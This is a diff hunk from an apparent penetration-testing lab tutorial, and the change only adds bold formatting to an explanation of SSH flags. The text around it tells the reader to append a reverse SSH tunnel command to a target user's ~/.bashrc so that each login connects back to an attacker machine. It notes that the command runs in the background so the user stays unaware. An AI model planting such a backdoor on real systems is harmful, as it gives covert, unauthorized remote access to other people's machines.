@@ -29,12 +29,12 @@ You'll set up an ingenious trap, one that will automatically establish an SSH co
 
 6. On the target machine, open the user's bashrc file by executing the command: **`nano ~/.bashrc`**. This command will open the nano text editor and display the contents of the bashrc file, providing the opportunity to plant the reverse shell.
 7. Append the following line to the end of the file: **`ssh -f -N -R 2222:localhost:22 <username>@<attacker_machine_IP>`**. Replace **`<username>`** with the username of the user account on the attacker machine and **`<attacker_machine_IP>`** with the IP address of the attacker machine. This command performs the following:
-- ssh invokes OpenSSH so that a connection can be made
-- -f runs the client in the background so that the user is unaware of the connection
-- -N specifies that no remote commands will be executed. This will ensure that an interactive shell is not established on the remote server.
-- -R specifies that the remote port needs to be forwarded to a local host and port
-- 2222 is the remote port that will forwarded to the local machine
-- localhost:22 is the localhost and port that traffic will be forwarded to via the established tunnel
+- **ssh** invokes OpenSSH so that a connection can be made
+- **-f** runs the client in the background so that the user is unaware of the connection
+- **-N** specifies that no remote commands will be executed. This will ensure that an interactive shell is not established on the remote server.
+- **-R** specifies that the remote port needs to be forwarded to a local host and port
+- **2222** is the remote port that will forwarded to the local machine
+- **localhost:22** is the localhost and port that traffic will be forwarded to via the established tunnel
 
 ![image](https://user-images.githubusercontent.com/20422508/221692243-59e4cf9c-f335-45e7-8ea8-66b522865ee0.png)
 
